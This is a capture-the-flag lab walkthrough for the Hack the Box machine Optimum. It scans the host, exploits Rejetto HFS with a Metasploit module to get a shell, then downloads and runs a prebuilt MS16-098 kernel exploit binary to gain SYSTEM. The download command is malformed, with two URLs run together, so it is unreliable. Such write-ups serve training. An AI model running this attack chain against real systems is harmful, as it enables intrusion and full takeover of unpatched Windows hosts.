# Hack the box - Optimum

<img align="left" src="logo.png">
&nbsp;<span style="color:#b5e853; font-weight: bold">OS: <img align="top" src="../../../images/windows.png"> </span><b>Windows</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">IP: </span><b>10.10.10.8</b>

&nbsp;<span style="color:#b5e853; font-weight: bold">Difficulity: </span><b>Easy</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">Release: </span><b>2017 Mar 18</b>

___

## Port scanning
```
nmap -sC -sV -T4 -oA nmap 10.10.10.8
```

![Nmap results](./nmap.png)

There is only web server running.

## Web exploration

On the main page we can see the link to the vendors page:

![Index page](index_page.png)

On the vendors page we can see that it is Rejetto:

![Rejetto](rejetto.png)

## Exploitation

We can check for potential exploits for rejetto:

```
searchsploit rejetto
```

![Searchsploit](searchsploit.png)

One module uses metasploit, let's try to execute it:

```
use exploit/windows/http/rejetto_hfs_exec
set rhosts 10.10.10.8
run
```

![Exploitation](exploitation.png)

## User flag

Great! We have a shell. Now it's time to capture user flag:

![User flag](user_flag.png)

## Privilege escalation

For privilege escalation we can use windows exploit suggester:

![Exploit suggester](exploit_suggester.png)

Script found a lot of potential exploits. 2nd exploit seems to work:

Local:
```
wget https://www.exploit-db.com/download/41020](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe
```

Target:
```
upload bfill.exe
shell
bfill.exe
```

![Privilege escalation](privilege_escalation.png)

## Root flag

We have system user. Time to capture root flag:

![Root flag](root_flag.png)